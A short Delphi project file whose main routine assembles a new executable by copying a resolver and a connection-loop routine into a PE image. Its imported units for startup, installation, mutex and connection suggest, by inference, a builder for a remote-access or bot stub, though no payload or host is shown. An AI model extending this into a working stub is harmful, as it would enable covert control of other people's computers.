program Project1;

uses
  Windows,
  untStartUp in 'Functions\untStartUp.pas',
  untUtils in 'untUtils.pas',
  untInstallation in 'Functions\untInstallation.pas',
  untLoader in 'Loader\untLoader.pas',
  Sysutils,
  Classes,
  untPE in 'Utils\untPE.pas',
  untConnection in 'Functions\untConnection.pas',
  untMutex in 'Functions\untMutex.pas';

var
  mPE:TPEFile;

procedure BuildSetup();
var
  dwSizeAll:DWORD;
  dwSize: DWORD;
begin
  mPE := TPEFile.Create;
  mPE.CreatePEBase;

  dwSize := DWORD(@resolver_end) - DWORD(@resolver_start);
  mPE.AddFunction(@resolver_start, dwSize);
  mPE.CustomizeLoader(dwSizeAll);

  dwSize := DWORD(@ConnectionLoop_END) - DWORD(@ConnectionLoop_CALLER);
  mPE.AddFunction(@ConnectionLoop_CALLER, dwSize);
  mPE.FixSectionLen();
  mPE.SaveFile('test.exe');
  mPE.Free;
end;

begin
   BuildSetup;
end.
